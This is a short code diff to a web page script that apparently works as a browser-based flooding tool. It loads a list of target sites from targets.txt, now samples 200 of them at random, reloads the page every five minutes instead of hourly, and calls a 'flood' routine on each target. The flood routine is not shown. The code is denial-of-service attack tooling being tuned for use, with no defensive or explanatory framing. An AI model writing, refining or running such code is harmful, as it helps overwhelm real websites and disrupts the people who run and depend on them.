@@ -33,14 +33,18 @@
   var targets = {};
 
   async function get_targets() {
-    targets = (await (await fetch ("targets.txt")).text()).split("\n");
-    targets  = targets.reduce((acc, e) =>
-      {
-        if (!/https?:\/\//.test(e)) {
-          e = 'https://' + e;
-        }
-        return {[e]: {number_of_errored_responses: 0, number_of_requests: 0}, ...acc};
-      }, {});
+    var source = (await (await fetch ("targets.txt")).text()).split("\n");
+    for (var i = 0; i < 200; i++) {
+      index = parseInt(Math.random() * source.length);
+      targets[source[index]] = {number_of_errored_responses: 0, number_of_requests: 0};
+    }
+    // targets  = targets.reduce((acc, e) =>
+    //   {
+    //     if (!/https?:\/\//.test(e)) {
+    //       e = 'https://' + e;
+    //     }
+    //     return {[e]: {number_of_errored_responses: 0, number_of_requests: 0}, ...acc};
+    //   }, {});
   }
 
   var statsEl = document.getElementById('stats');
@@ -95,6 +99,6 @@
 
   // Start
   document.getElementById('refreshed').innerHTML = Date();
-  setInterval(() => {location.reload();}, 3600000);
+  setInterval(() => {location.reload();}, 300000);
   get_targets().then(() => {Object.keys(targets).map(flood)});
 </script>
